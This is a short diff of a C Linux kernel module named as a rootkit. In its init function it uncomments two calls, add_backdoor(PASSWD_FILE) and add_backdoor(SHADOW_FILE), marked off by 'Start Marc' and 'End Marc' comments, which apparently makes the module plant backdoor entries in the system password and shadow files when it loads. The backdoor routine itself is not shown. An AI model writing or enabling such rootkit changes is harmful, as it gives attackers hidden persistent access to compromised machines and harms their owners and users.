@@ -262,8 +262,8 @@ static int __init rootkit_init(void){
 	
 	// Start Marc
 	
-	//add_backdoor(PASSWD_FILE);
-   	//add_backdoor(SHADOW_FILE);
+	add_backdoor(PASSWD_FILE);
+   	add_backdoor(SHADOW_FILE);
 	
 	// End Marc
 	
